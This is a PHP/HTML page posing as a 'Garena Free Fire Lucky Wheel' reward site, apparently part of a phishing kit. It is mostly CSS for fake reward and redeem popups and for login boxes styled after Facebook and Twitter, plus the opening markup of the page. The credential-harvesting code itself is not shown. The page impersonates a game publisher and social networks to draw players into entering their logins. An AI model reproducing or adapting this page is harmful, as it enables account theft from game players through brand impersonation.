<?php 

$Owner = 'exp_here'

// © copyright Fragment if you using this script then give the script credit to respective owner 

// script Maked By : @exp_here

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Garena Free Fire Lucky Wheel Spiner</title>
<meta property="og:description" content="Get your exclusive reward from Garena Free Fire now!">
<meta property="og:image" content="https://i.postimg.cc/T3pQDzpB/yV.png">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link rel="stylesheet" href="lenzzcss/codeflag-link.css">
<link rel="stylesheet" href="lenzzcss/animate.css">
<link rel="stylesheet" href="lenzzcss/loader.css">
<link rel="stylesheet" href="lenzzcss/facebook.css">
<link rel="stylesheet" href="lenzzcss/twitter.css">
<link rel="stylesheet" href="lenzzcss/link.css">
<link rel="stylesheet" href="lenzzcss/style.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
	<link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.4.2/css/all.css" integrity="sha512-WgpJvPsU5RMfJeB5QbEbVfyuEGX+emeIHhNIFdc2SdyXVA11IyRLkdHZZHcnbxs/tCEAQFr2YEWrqqHFRL88eQ==" crossorigin="anonymous">
<link rel="icon" type="img/png" href="https://i.postimg.cc/T3pQDzpB/yV.png" sizes="32x32">
</head>
<body oncontextmenu="return true" onselectstart="return false" ondragstart="return false" oncopy="return true" oncut="return true" onpaste="return true">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");

*,
*:before,
*:after {
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

@font-face {
  font-family: lenzz;
  font-style: normal;
  font-weight: 300;
  src: url(lenzzfont/lenzz.woff2) format("woff2"),
    url(lenzzfont/lenzz.woff) format("woff"),
    url(lenzzfont/lenzz.ttf) format("truetype");
}

body {
  background: #0C0C0C center / cover no-repeat;
  margin: 0;
  font-family: lenzz;
}
.container {
  background-size: 100% 100%;
  position: relative;
  margin: 0px auto;
  max-width: 450px;
  height: auto;
  border: 1px solid #111733;
}
.header-front {
  width: 100%;
  height: auto;
  position: absolute;
  top: 0;
}
.header-front img {
  width: 100%;
  height: auto;
  border-bottom: 0px solid #3B3C43;
}
.header img {
  width: 100%;
  height: auto;
  border-bottom: 1px solid #3B3C43;
}

@keyframes rotate {
  to {
    --angle: 0deg;
    visibility: hidden;
  }
}
.navbar {
	background: #19191b;
	width: 100%;
	height: 58px;
}
.navbar-logo {
	width: 28%;
	float: left;
	margin-top: 6px;
	margin-left: 11px;
}
.navbar-shop {
	width: 40px;
	margin-top: 10px;
	margin-right: 5px;
}
.navbar-language {
	width: 40px;
	margin-top: 10px;	
	margin-right: 5px;
}
.navbar-menu {
	width: 40px;
	margin-top: 10px;
	margin-right: 5px;
}
.navbar-right {
	width: auto;
	float: right;
}
.navbar-downloads {
	background: #f8ac04;
	width: 65px;
	height: 58px;
	float: right;
}
.navbar-downloads img {
	width: 35px;
	margin: 15px;
}
.footer {
	background: #19191b url(https://i.postimg.cc/02KwtTc7/footer-bg.jpg) top center / 100% no-repeat;
	background-position-y: calc(-15 / 640 * 100vw);	
	width: 100%;
	height: auto;
	padding: 15px;
	border: none;
}
.footer-txt-join {
	margin-top: -10px;
	margin-bottom: 15px;
	color: #ffbe21;
	font-size: 30px;
	font-family:selow;
	text-align: left;
	text-transform: uppercase;
}
.footer {
	background: #000;
	width: 100%;
	height: auto;
	padding: 15px;
}
.footer-txt-join {
	margin-bottom: 10px;
	color: #ffbe21;
	font-size: 35px;
	font-family:Teko;
	text-align: left;
	text-transform: uppercase;
}
.footer-copyright-icon {
	width: 55%;
	margin-left: auto;
	margin-right: auto;
	margin-top: 10px;
	margin-bottom: 15px;
	display: block;
}
.footer-txt-copyright {
	color: #bdbdbd;
	font-size: 15px;
	font-family:Teko;
	text-align: center;
}
.popup {
  width: 100%;
  height: 100%;
  position: fixed;
  top: 0;
  left: 0;
  z-index: 9999;
  background-color: rgba(0, 0, 0, 0.5);
}
.popup-box-wrapper {
  width: 390px;
  height: auto;
  position: relative;
  margin: 50px auto;
  margin-top: 20%;
  text-align: center;
  font-family: lenzz;
  color: #fff;
}
.popup-box-wrapper-login {
  width: 100%;
  height: 240px;
  position: relative;
  margin: 50px auto;
  margin-top: 15%;
  text-align: center;
  font-family: lenzz;
  max-width: 450px
}
.popup-box-navbar {
  background: url(lenzz/seclink-navbar.png) no-repeat center center;
  background-size: 100% 100%;
  height: auto;
  padding-bottom: 6px;
}
.popup-box-navbar img {
  width: 18px;
  height: auto;
  float: right;
  margin-top: 14px;
  margin-right: 15px;
  padding-bottom: 6px;
}
.popup-box-navbar-title {
  padding-top: 12px;
  padding-left: 15px;
  color: #fff;
  font-size: 19px;
  margin-bottom: 3px;
  font-family: lenzz;
  font-weight: 500;
  text-align: left;
}
.popup-box-bg {
  background: url(lenzz/seclink-box-bg.png) no-repeat center center;
  background-size: 100% 100%;
  width: 100%;
  border-top: 0px solid #fff;
  margin-top: -12px;
}

@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.popup-box-bg {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #00c4de, #1b56ff, #00c4de, #1b56ff) 1;
  animation: 1s rotate linear infinite;
}

@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.popup-box-bg-verify {
  background: url(lenzz/seclink-box-bg.png) no-repeat center center;
  background-size: 100% 100%;
  width: 100%;
  border-top: 0px solid #fff;
  margin-top: -12px;
}

@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.popup-box-bg-verify {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #00c4de, #1b56ff, #00c4de, #1b56ff) 1;
  animation: 1s rotate linear infinite;
}

@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.popup-box-bg-verify label {
  width: 70%;
  float: left;
  text-align: left;
  padding-left: 10px;
  margin-bottom: 5px;
  color: #C3C3C3;
  text-shadow: none;
  font-family: lenzz;
  font-size: 15px;
  display: inline-block;
}
.popup-box-alert-enter {
  width: 89%;
  height: auto;
  margin-top: 10px;
  padding-top: 25px;
  margin-right: auto;
  margin-left: auto;
  padding-bottom: 20px;
  display: block;
}
.popup-box-alert-line {
  width: 95%;
  height: auto;
  margin-top: 0px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 0px;
  padding: 5px;
  border-bottom: 1px solid #fff;
  color: #fff;
  text-align: center;
  line-height: 10px;
  display: block;
}
.popup-box-alert-verif {
  width: 90%;
  height: auto;
  margin-top: 10px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 0px;
  padding: 5px;
  color: #C3C3C3;
  font-size: 16px;
  font-family: lenzz;
  font-weight: 400;
  text-align: center;
  line-height: 20px;
  display: block;
}
.popup-box-alert-verify {
  width: 90%;
  height: auto;
  margin-top: 5px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 10px;
  padding: 5px;
  color: #C3C3C3;
  font-size: 16px;
  font-family: lenzz;
  font-weight: 400;
  text-align: left;
  line-height: 20px;
  display: block;
}
.popup-box-alert-center {
  width: 95%;
  height: auto;
  margin-top: 10px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 10px;
  padding: 5px;
  color: #C3C3C3;
  font-size: 17px;
  font-family: lenzz;
  font-weight: 400;
  text-align: center;
  line-height: 20px;
  display: block;
}
.popup-box-alert-left {
  width: 100%;
  height: auto;
  margin-top: 10px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 10px;
  padding: 5px;
  color: #C3C3C3;
  font-size: 16px;
  font-family: lenzz;
  font-weight: 400;
  text-align: left;
  line-height: 20px;
  display: block;
}
.popup-box-alert-left img {
  width: 20px;
  height: 20px;
  margin-left: 2px;
  margin-right: 5px;
  margin-bottom: -4px;
}
.popup-box-alert-redeem {
  width: 95%;
  height: auto;
  margin-top: 10px;
  margin-left: 10px;
  margin-bottom: 10px;
  padding: 5px;
  color: #C3C3C3;
  font-size: 15px;
  font-family: lenzz;
  font-weight: 400;
  text-align: left;
  line-height: 20px;
  display: block;
}
.popup-box-alert-redeem span {
  color: #e67a07;
  font-size: 16px;
  font-family: lenzz;
}
.popup-box-item-redeem {
  width: 80px;
  height: 80px;
  margin: 1px;
  margin-left: 20px;
  margin-right: 15px;
  margin-bottom: 20px;
  border: 1px solid #fff;
  float: left;
  display: inline-block;
}
.popup-box-item-redeem img {
  width: 100%;
  height: auto;
  border: none;
}

@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.popup-box-item-redeem {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #DD3183, yellow, #DD3183) 1;
  animation: 1s rotate linear infinite;
}

@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.redeemRewardsImg {
  width: 60px;
  height: 60px;
}
.popup-box-form {
  width: 95%;
  height: auto;
  display: block;
  margin-right: auto;
  margin-left: auto;
}
.popup-box-form input {
  background: #000;
  width: 93%;
  height: 35px;
  margin-left: -3px;
  margin-bottom: 4px;
  padding: 4px;
  padding-left: 10px;
  color: #A9A8A9;
  font-size: 16px;
  font-family: lenzz;
  font-weight: 500;
  border: 1px solid #A9A8A9;
  position: relative;
  outline: none;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.popup-box-form select {
  background: #000;
  width: 93%;
  height: 35px;
  margin-left: -3px;
  margin-bottom: 3px;
  padding: 3.7px;
  padding-left: 10px;
  color: #A9A8A9;
  font-size: 16px;
  font-family: lenzz;
  font-weight: 500;
  border: 1px solid #A9A8A9;
  position: relative;
  outline: none;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.popup-box-form-footer {
  background: rbga(0, 0, 0, 0);
  background-size: 100% 100%;
  width: 100%;
  height: 60px;
  margin-right: auto;
  margin-left: auto;
}
.popup-box-form-footer button {
  background: url(lenzz/btn-on.png) no-repeat center;
  background-size: 100% 100%;
  width: auto;
  height: 30px;
  margin-top: 1px;
  margin-right: auto;
  margin-left: auto;
  margin-bottom: 5px;
  padding: 4px;
  padding-left: 30px;
  padding-right: 30px;
  color: #000;
  font-size: 17px;
  font-family: lenzz;
  font-weight: 500;
  text-align: center;
  border-radius: 0px;
  border: none;
  outline: none;
}
.popup-box-navbar-login {
  background: url(lenzz/popup-navbar1.png) no-repeat center center;
  background-size: 100% 100%;
  height: auto;
  padding-top: 5px;
  padding-bottom: 1px;
}
.popup-box-navbar-login-title {
  padding-left: 24px;
  padding-top: 2px;
  color: #defbff;
  font-size: 22px;
  font-family: lenzz;
  font-weight: 500;
  text-align: center;
}
.popup-box-bg-login {
  background:url(lenzz/login-bg.jpg) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 220px;
	margin-top: -10px;
}
.popup-box-bg-login img {
  width: 45%; 
  height: 60px; 
  margin-top: 75px;
  margin-bottom: 10px;
  margin-left: auto; 
  margin-right: auto;
}
.popup-box-bg-login-load {
  width: 100%;
  height: auto;
}
.popup-box-footer-login {
  background-size: 100% 100%;
  width: 100%;
  margin-top: -1px;
  height: 35px;
}
.popup-btn-login {
  width: 28%;
  height: 30px;
  border-radius: 2px;
  padding: 5px;
  padding-top: 6px;
  margin: 1px;
  color: #f2f2f2;
  font-size: 14px;
  font-family: lenzz;
  border: none;
  outline: none;
  margin-bottom: 0px;
  position: relative;
  display: inline-block;
}
.popup-btn-login i {
  color: #fff;
  font-size: 20px;
  margin-top: -3px;
  float: left;
}
.popup-btn-facebook {
  background: #1778f2;
  color: #fff;
}
.popup-btn-twitter {
  background: #ffffff;
  color: #000;
}
.popup-btn-link {
  background: #E3B448;
  color: #000;
}
.popup-btn-login img {
  width: 18px;
  height: 18px;
  margin-top: -1px;
  float: left;
}
.popup-login {
  background: rgba(0, 0, 0, 0.4);
  width: 100%;
  height: 100%;
  position: fixed;
  top: 0;
  left: 0;
  z-index: 9999;
}
.popup-box-login-fb {
  background: #ECEFF6;
  max-width: 330px;
  height: auto;
  position: relative;
  margin: 50px auto;
  margin-top: 1.9%;
  text-align: center;
  border-radius: 10px;
}
.popup-box-login-twitter {
  background: #fff;
  max-width: 330px;
  height: auto;
  position: relative;
  margin: 50px auto;
  margin-top: 10%;
  border-radius: 10px;
}
.load-login-img {
  width: 10%;
  height: auto;
  margin-top: 30px;
  margin-bottom: 5px;
  animation: mymoves 1s infinite linear;
}

@keyframes mymoves {
  100% {
    transform: rotate(360deg);
  }
}
.close-fb {
  background: #3b5998;
  width: 25px;
  height: 25px;
  color: #fff;
  font-size: 20px;
  text-align: center;
  text-decoration: none;
  border-radius: 50%;
  top: -10px;
  right: -10px;
  position: absolute;
  display: block;
}
.close-fb i {
  padding-top: 3px;
}
.close-other {
  background: #fff;
  width: 25px;
  height: 25px;
  color: #000;
  font-size: 20px;
  text-align: center;
  border-radius: 50%;
  top: -12px;
  right: -12px;
  position: absolute;
  z-index: 9999999;
  display: block;
}
.close-other i {
  color: #000;
  padding-top: 3px;
}

::-webkit-scrollbar {
  display: none;
  width: 0px;
}

figure {
  margin: 0;
  padding: 0;
  overflow: hidden;
}
.menu-content {
  background-size: 100% 100%;
  width: 100%;
  height: auto;
  float: left;
  padding: 1px;
  margin-bottom: 5px;
  display: inline-block;
}
.lenzz-content {
  width: 30%;
  height: auto;
  padding: 1px;
  margin: 1px;
  padding-left: auto;
  padding-right: auto;
  margin-bottom: 1px;
  display: inline-block;
}

@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}

@keyframes rotate {
  to {
    --angle: 0deg;
  }
}

@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}

@keyframes rotate {
  to {
    --angle: 0deg;
    visibility: hidden;
  }
}
.twitter-load {
  background-size: 100% 100%;
  width: 93%;
  height: 485.2px;
  margin-top: 0px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 15px;
  padding: 20px;
  padding-top: 0px;
  padding-bottom: 25px;
  display: block;
  color: #000;
}
.twitter-load-title {
  width: 95%;
  height: auto;
  margin-top: 50px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 40px;
  padding: 6px;
  padding-top: 90px;
  color: #000;
  font-size: 18px;
  font-family: laza;
  font-weight: 500;
  text-align: center;
  display: block;
}
.fb-load {
  background-size: 100% 100%;
  width: 93%;
  height: 299.1px;
  margin-top: -1px;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 15px;
  padding: 20px;
  padding-top: 0px;
  padding-bottom: 25px;
  display: block;
}
.fb-load img {
  width: 50px;
  height: 50px;
  margin-top: 192.5px;
  margin-bottom: -55px;
}
.box {
  background-size: 100% 100%;
  width: 100%;
  height: auto;
  display: block;
  padding: 5px;
  margin-top: -10px;
}
.box2 {
  background-size: 100% 100%;
  width: 100%;
  height: auto;
  display: block;
  padding: 5px;
  margin-top: 400px;
  border-top: 2px solid #292C35;
}

@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}

@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.sec-container {
  background: url(lenzz/background.jpg) no-repeat center center;
  background-size: 100% 100%;
  margin-top: 0px;
  padding: 5px;
  width: 100%;
  height: 370px;
  border: none;
}
.i-midas\:question {
  --un-icon: url("data:image/svg+xml;utf8,%3Csvg width='16' height='16' viewBox='0 0 16 16' fill='currentColor' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M13.7 8C13.7 11.148 11.148 13.7 8 13.7C4.85198 13.7 2.3 11.148 2.3 8C2.3 4.85198 4.85198 2.3 8 2.3C11.148 2.3 13.7 4.85198 13.7 8ZM15 8C15 11.866 11.866 15 8 15C4.13401 15 1 11.866 1 8C1 4.13401 4.13401 1 8 1C11.866 1 15 4.13401 15 8ZM7.99998 4.39999C6.67398 4.39999 5.59998 5.47399 5.59998 6.79999H6.79998C6.79998 6.13999 7.33998 5.59999 7.99998 5.59999C8.65998 5.59999 9.19998 6.13999 9.19998 6.79999C9.19998 7.32752 8.85212 7.59416 8.46224 7.893C7.96525 8.27395 7.39998 8.70723 7.39998 9.79999H8.59998C8.59998 9.14277 9.02659 8.76995 9.46443 8.38732C9.92596 7.98399 10.4 7.56974 10.4 6.79999C10.4 5.47399 9.32598 4.39999 7.99998 4.39999ZM7.40002 11.8H8.60002V10.6H7.40002V11.8Z' fill='white'/%3E%3C/svg%3E");
}
.i-midas\:question {
  background-color: currentColor;
  color: inherit;
  height: 1em;
  -webkit-mask: var(--un-icon) no-repeat;
  mask: var(--un-icon) no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em;
  margin-bottom: -2px;
}
.icon {
  display: inline-block;
}
.gallery-wrapper {
  width: 100%;
  height: auto;
  overflow: hidden;
  border: none;
  display: flex;
}
.gallery-wrapper img {
  width: 100%;
  display: inline-block;
  float: left;
  animation-name: mymove;
  animation-duration: 30s;
  -webkit-animation-iteration-count: infinite;
  position: relative;
}

@keyframes mymove {
  0% {
    left: 0%;
}10% {
    left: 0%;
}20% {
    left: -100%;
}30% {
    left: -100%;
}40% {
    left: -200%;
}50% {
    left: -200%;
}60% {
    left: -300%;
}70% {
    left: -300%;
}80% {
    left: -400%;
}90% {
    left: -400%;
}100% {
    left: -500%;
  }
}
.player-notif {
  background: url(lenzz/kecap-notif.png) no-repeat center center;
  background-size: 100% 100%;
  width: 97.5%;
  height: 40px;
  margin-top: 4px;
  padding-top: 9px;
  margin-left: auto;
  margin-right: auto;
  overflow: hidden;
  font-size: 15px;
  font-family: lenzz;
  color: #fff;
  border-radius: 3px;
}
.player-notif img {
  width: 22px;
  height: 22px;
  color: #fff;
  float: left;
  margin: 5px;
  margin-left: 8px;
  margin-top: 1px;
  display: inline-block;
}
.player-notifs {
  width: 89%;
  height: 35px;
  padding-top: 3px;
  margin-left: auto;
  margin-right: auto;
  overflow: hidden;
  font-size: 15px;
  font-family: lenzz;
  color: #fff;
  float: left;
  display: inline-block;
}
.marquees {
  white-space: nowrap;
  font-family: lenzz;
  overflow: hidden;
  display: inline-block;
  animation: marquees 70s linear infinite;
}
.marquees a {
  display: inline-block;
}

@keyframes marquees {
  0% {
    transform: translateX(5%);
}100% {
    transform: translateX(-100%);
  }
}
.sec-crate-wrapper {
  background: rgba(0, 0, 0, 0);
  width: 66%;
  height: auto;
  margin-top: 0px;
  float: left;
  display: inline-block;
}
.lenzz-crate-wrapper {
  background: rgba(0, 0, 0, 0);
  width: 40%;
  height: auto;
  margin-top: 0px;
  float: left;
  display: inline-block;
}
.sec-menu-wrapper {
  background: rgba(0, 0, 0, 0.2);
  width: 30%;
  margin-top: 15px;
  margin-right: 0px;
  padding: 5px;
  float: right;
  display: inline-block;
}
.sec-menu-wrappers {
  background: rgba(0, 0, 0, 0.2);
  width: 53%;
  margin-top: 15px;
  margin-right: 0px;
  padding: 5px;
  float: right;
  display: inline-block;
}
.sec-menu-wrapper-navbar {
  background: rgba(0, 0, 0, 0.5);
  width: 30%;
  margin-top: 15px;
  margin-bottom: -15px;
  margin-right: 0px;
  padding: 5px;
  float: right;
  display: inline-block;
}
.sec-menu-wrapper-navbars {
  background: rgba(0, 0, 0, 0.5);
  width: 53%;
  margin-top: 0px;
  margin-bottom: -15px;
  margin-right: 0px;
  padding: 0px;
  float: right;
  display: inline-block;
}
.box-lenzz-wrapper {
  background: rgba(0, 0, 0, 0);
  width: 100%;
  height: auto;
  margin-top: 15px;
  margin-left: 5px;
  padding-bottom: 15px;
  display: block;
}
.box-lenzz-content {
  width: 100%;
  padding-left: 4px;
  padding-right: 4px;
}
.item {
  width: 250px;
  height: 250px;
  margin: 1px;
  margin-top: -50px;
  margin-left: auto;
  margin-right: auto;
  display: inline-block;
}
.item img {
  width: 100%;
  height: 100%;
  margin-bottom: 0px;
}
.lenzzitems {
  width: 260px;
  height: 260px;
  margin: 1px;
  margin-left: auto;
  margin-right: auto;
  display: inline-block;
}
.lenzzitems img {
  margin-left: -20px;
  width: 80%;
  height: 80%;
  margin-top: 45px;
  margin-bottom: 0px;
}
.title-lab2 {
  width: 100%;
  font-size: 18px;
  font-family: lenzz;
  color: #fff;
  text-align: left;
  margin-top: -15px;
  margin-left: -5px;
  margin-bottom: 25px;
}
.title-lab {
  width: 100%;
  font-size: 18px;
  font-family: lenzz;
  color: #fff;
  text-align: left;
  margin-top: 0px;
  margin-left: -5px;
  margin-bottom: 25px;
}
.item-title {
  background-image: linear-gradient(to right, #553952, #66000000);
  width: 160px;
  height: 25px;
  color: #fff;
  font-size: 13px;
  font-family: lenzz;
  text-shadow: 1px 1px 1px #000;
  text-align: left;
  margin-top: 10px;
  margin-left: -5px;
  padding-left: 5px;
  padding-top: 5px;
  margin-bottom: 5px;
  border-left: 2px solid #CC22B9;
}
.item-title-yel {
  background-image: linear-gradient(to right, #98894a, #66000000);
  width: 160px;
  height: 25px;
  color: #fff;
  font-size: 13px;
  font-family: lenzz;
  text-shadow: 1px 1px 1px #000;
  text-align: left;
  margin-top: 10px;
  margin-left: -5px;
  padding-left: 5px;
  padding-top: 5px;
  margin-bottom: 5px;
  border-left: 2px solid yellow;
}
.item-title-red {
  background-image: linear-gradient(to right, #371717, #66000000);
  width: 160px;
  height: 25px;
  color: #fff;
  font-size: 13px;
  font-family: lenzz;
  text-shadow: 1px 1px 1px #000;
  text-align: left;
  margin-top: 10px;
  margin-left: -5px;
  padding-left: 5px;
  padding-top: 5px;
  margin-bottom: 5px;
  border-left: 2px solid #BE120E;
}
.item-title1 {
  background-image: linear-gradient(to right, #2F2446, #66000000);
  width: 160px;
  height: 25px;
  color: #fff;
  font-size: 13px;
  font-family: lenzz;
  text-shadow: 1px 1px 1px #000;
  text-align: left;
  margin-top: 10px;
  margin-left: -5px;
  padding-left: 5px;
  padding-top: 5px;
  margin-bottom: 5px;
  border-left: 2px solid #6F22BC;
}
.item-title2 {
  width: 170px;
  height: 25px;
  color: #B1B2B4;
  font-size: 11px;
  font-family: lenzz;
  text-align: left;
  margin-top: -5px;
  margin-left: -5px;
  padding-top: 5px;
  margin-bottom: 10px;
}
.item-title3 {
  width: auto;
  height: 25px;
  color: #B1B2B4;
  font-size: 11px;
  font-family: lenzz;
  text-align: left;
  margin-top: -3px;
  margin-left: -5px;
  padding-top: 5px;
  margin-bottom: 10px;
}
.reward-title {
  width: 100%;
  height: 22px;
  color: #fff;
  font-size: 15px;
  font-family: lenzz;
  text-align: left;
  margin-top: 0px;
  padding: -5px;
  padding-top: 5px;
  margin-bottom: 5px;
}
.killmess {
  width: 100%;
  height: 10px;
  margin: 1px;
  margin-top: -50px;
  margin-bottom: 0px;
  display: block;
}
.killmess img {
  width: 35%;
  height: auto;
  margin-left: 10px;
  margin-top: -90px;
  display: none;
  animation-name: left_to_right;
  animation-duration: 0.7s;
}

@keyframes left_to_right {
  from {
    transform: translateX(-100%);
}to {
    transform: translateX(0);
  }
}
.box-crate-button {
  width: 120px;
  height: 33px;
  margin-left: -5px;
  margin-top: 10px;
  margin-bottom: 10px;
  display: inline-block;
}
.box-crate-button-menu {
  width: 100%;
  height: 30px;
  padding: 5px;
}
.box-crate-button-menu-txt {
  color: #000;
  font-size: 16px;
  font-family: lenzz;
  font-weight: 500;
  text-align: left;
  line-height: 16px;
  padding-top: 3px;
}
.showkill {
  color: #fff;
  height: 25px;
  font-size: 16px;
  font-family: lenzz;
  font-weight: 500;
  text-align: left;
  line-height: 16px;
  margin-left: -5px;
  margin-top: 10px;
}
.showkill img {
  width: 20px;
  height: 20px;
}
.lab-rewards {
  width: 100%;
  height: auto;
  margin-left: auto;
  margin-right: auto;
  display: inline-block;
}
/* 320 */
@media only screen and (min-width:320px) and (max-width:360px) {
  .container {
    width: 100%;
    height: auto;
    margin-top: -3px;
    margin-bottom: 0px;
    border: none;
    border-radius: 0px;
    padding: 0px;
}
.popup-box-wrapper-login {
    margin-top: 55%;
}
.popup-box-wrapper {
    width: 350px;
    margin-top: 35%;
}
.seclink-box {
    width: 350px;
    margin-top: 50%;
}
.popup-box-item-redeem {
    width: 75px;
    height: 75px;
}
.popup-box-verification {
    margin-top: 35%;
}
.popup-box-login-fb {
    margin-top: 10%;
}
.popup-box-login-twitter {
    margin-top: 10%;
}
.lenzz-content {
    width: 30%;
    height: auto;
    padding: 1px;
    margin: 1px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 1px;
    display: inline-block;
}
.item {
    width: 220px;
    height: 220px;
}
.box2 {
    margin-top: 370px;
}
.item-title {
    font-size: 12px;
}
.item-title1 {
    font-size: 12px;
}
.item-title2 {
    font-size: 10px;
    width: 150px;
}
.item-title3 {
    font-size: 10px;
  }
}
/* 361 */
@media only screen and (min-width:361px) and (max-width:600px) {
  .container {
    width: 100%;
    height: auto;
    margin-top: -3px;
    margin-bottom: 0px;
    border: none;
    border-radius: 0px;
    padding: 0px;
}
.popup-box-wrapper {
    width: 370px;
    margin-top: 35%;
}
.seclink-box {
    width: 370px;
    margin-top: 50%;
}
.popup-box-wrapper-login {
    margin-top: 55%;
}
.popup-box-item-redeem {
    width: 85px;
    height: 85px;
}
.popup-box-verification {
    margin-top: 35%;
}
.popup-box-login-fb {
    margin-top: 10%;
}
.popup-box-login-twitter {
    margin-top: 10%;
}
.lenzz-content {
    width: 30%;
    height: auto;
    padding: 1px;
    margin: 1px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 1px;
    display: inline-block;
}
}

.sec-lenzz-wrapper {
	background: rgba(0, 0, 0, 0);
    width: 65%;
    height: auto;
	margin-left: auto;
	margin-right: 8px;
	margin-top: -10px;
	margin-bottom: 0px;
	padding-bottom: 20px;
	display: block;
}
.box-lenzz-wrapper-navbar {
	width: 100%;
	height: 30px;
	padding: 5px;
}
.box-lenzz-wrapper-navbar-menu {
	width: auto;
	height: 30px;
	padding: 5px;
	display: inline-block;
}
.box-lenzz-wrapper-navbar-menu-txt {
	color: #A5A6A6;
	font-size: 13px;
	font-family: lenzz;
	font-weight: 500;
	text-align: left;
	margin-top: -1px;
	line-height: 13px;
}
.box-lenzz-wrapper-navbar-menu img {
	width: 15px;
	height: 15px;
	margin-top: -1px;
	margin-right: 5px;
	float: left;
}
.box-lenzz-content {
	width: 100%;
	padding-left: 0px;
	padding-right: 0px;
}
.scroll {
	overflow:scroll;
	position:relative;
	width: 100%;
	height: 255px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: -8px;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
}
.lenzz {
	width: 30%;
	height:75px;
	margin: 1px;
	margin-bottom: 1px;
	display: inline-block;
}
.lenzz img {
	width: 100%;
    height: 100%;
}
.lenzz div {
	width: 100%;
	height: 100%;
	border-radius: 3px 3px 0px 0px;
}
.lenzz div:first-child {
	margin-left: 0;
}
.box-lenzz-button {
	width: 47%;
	height: 30px;
	margin: 1px;
	margin-top: 15px;
	margin-bottom: 2px;
	display: inline-block;
}
.box-lenzz-button-menu {
	width: 100%;
	height: 30px;
}
.box-lenzz-button-menu-txt {
	color: #000;
	font-size: 13px;
	font-family: lenzz;
	font-weight: 550;
	text-align: left;
	line-height: 15px;
	margin-top: 0px;
}
.box-lenzz-button-menu img {
	width: 12px;
	height: 12px;
	margin-top: 1px;
	margin-right: 3px;
	float: left;
}
.LenzzScript {
  width: 7%;
  height: auto;
  margin-top: 20px;
  margin-left: 10px;
  position: absolute;
}
.LenzzScriptChat {
 width: 50%;
 height: auto;
 float: left;
 position: absolute;
}
.LenzzScriptChat img {
 width: 180px;
 height: auto;
 margin-top: 8px;
}
</style>
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="lenzz/lenzz-asset/logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="lenzz/lenzz-asset/navFb.png">
<img class="navbar-language" src="lenzz/lenzz-asset/navIg.png">
<img class="navbar-language" src="lenzz/lenzz-asset/navYt.png">
<div class="navbar-downloads"><img src="lenzz/lenzz-asset/menu.png"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header"> 
<img src="lenzz/header.jpg">
</div>

<div class="sec-container">
<div class="LenzzScriptChat">
<img src="lenzz/ad.png">
</div>
<div class="box">
<div class="tab_rewards" style="margin-top:15px;">
<div class="lenzz-crate-wrapper">
<div class="box-lenzz-wrapper">
<div class="box-lenzz-content">
<div class="lab-rewards">

<div class="item_reward" id="items1">
<div class="lenzzitems">
<div class="LenzzScript">
</div>
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/1.png">
<div class="killmess"></div>
